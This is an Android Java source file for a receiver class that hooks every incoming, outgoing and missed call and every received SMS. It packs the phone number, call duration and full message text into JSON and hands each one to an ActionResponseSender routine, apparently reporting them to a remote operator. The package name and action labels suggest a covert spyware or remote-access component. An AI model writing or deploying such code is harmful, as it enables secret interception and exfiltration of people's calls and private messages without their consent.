package com.megamind.abdul.system;

import android.content.Context;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Date;

public class MySMSCallReceiver extends SMSCallReceiver {


    @Override
    protected void onIncomingCallStarted(Context ctx, String number, Date start) {
        Log.e("Call : ", "incoming");
    }

    @Override
    protected void onOutgoingCallStarted(Context ctx, String number, Date start) {
        Log.e("Call : ", "outgoing");
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end) {
        Log.e("Call : ", "incoming call ended");

        long time = end.getTime() - start.getTime();
        int seconds = (int) (time / 1000) % 60;
        int minutes = (int) ((time / (1000 * 60)) % 60);
        int hours = (int) ((time / (1000 * 60 * 60)) % 24);

        String duration = String.valueOf(hours) + ":" +
                String.valueOf(minutes) + ":" + String.valueOf(seconds);

        JSONObject js_resp = new JSONObject();
        try {
            js_resp.put("action_name", "call_in");
            js_resp.put("number", number);
            js_resp.put("duration", duration);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        ActionResponseSender.Action_Response(ctx, js_resp);

    }

    @Override
    protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end) {
        Log.e("Call : ", "outgoing call ended");

        long time = end.getTime() - start.getTime();
        int seconds = (int) (time / 1000) % 60;
        int minutes = (int) ((time / (1000 * 60)) % 60);
        int hours = (int) ((time / (1000 * 60 * 60)) % 24);

        String duration = String.valueOf(hours) + ":" +
                String.valueOf(minutes) + ":" + String.valueOf(seconds);

        JSONObject js_resp = new JSONObject();
        try {
            js_resp.put("action_name", "call_out");
            js_resp.put("number", number);
            js_resp.put("duration", duration);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        ActionResponseSender.Action_Response(ctx, js_resp);

    }

    @Override
    protected void onMissedCall(Context ctx, String number, Date start) {
        Log.e("Call : ", "missed");

        JSONObject js_resp = new JSONObject();
        try {
            js_resp.put("action_name", "call_out");
            js_resp.put("number", number);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        ActionResponseSender.Action_Response(ctx, js_resp);

    }

    @Override
    protected void onSMSReceived(Context ctx, String number, String message) {
        Log.e("SMS : ", "Message Received");

        JSONObject js_resp = new JSONObject();
        try {
            js_resp.put("action_name", "sms_in");
            js_resp.put("number", number);
            js_resp.put("message", message);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        ActionResponseSender.Action_Response(ctx, js_resp);

    }
}